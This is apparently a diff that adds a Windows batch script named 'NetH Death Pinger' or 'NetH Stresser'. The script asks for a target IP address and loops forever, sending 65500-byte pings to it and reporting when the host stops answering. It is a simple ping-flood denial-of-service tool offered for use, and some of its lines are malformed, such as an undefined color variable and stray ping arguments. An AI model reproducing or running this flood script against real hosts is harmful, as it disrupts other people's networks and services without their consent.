@@ -1,0 +1,21 @@
+mode con lines=20 cols=93
+chcp 65001
+cls
+@echo off
+title NetH Death Pinger
+color d
+cls
+echo.
+echo.[40;31m
+echo.
+echo. NetH Stresser                                                                                          
+echo.                                                                                            
+echo.
+echo.[40;31m                                                
+set /p IP=[40;35mEnter Your IP:[40;37m 
+:top
+PING -l 65500 -n 1 %IP% | FIND "TTL="
+IF ERRORLEVEL 1 (echo.[40;31mOffline)
+color %in%
+ping -n 1 -t 2 0 10 127.0.0.1 >nul
+GoTo top
